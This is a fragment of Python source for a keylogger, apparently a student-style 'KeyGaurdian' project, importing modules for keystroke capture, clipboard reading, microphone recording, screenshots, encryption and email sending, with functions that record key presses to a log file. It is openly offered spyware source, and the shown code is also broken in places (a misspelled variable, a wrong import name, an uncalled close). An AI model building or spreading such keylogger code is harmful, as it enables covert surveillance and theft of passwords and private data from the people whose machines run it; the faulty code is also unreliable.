# Libraries

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

key_information = "key_log.txt"

file_path = "D:\\KeyGaurdian_project\\Keylogger.py"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys,count

    print(key)
    keys.append(key)
    count += 1

def write_file(keys):
    with open(file_path + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close
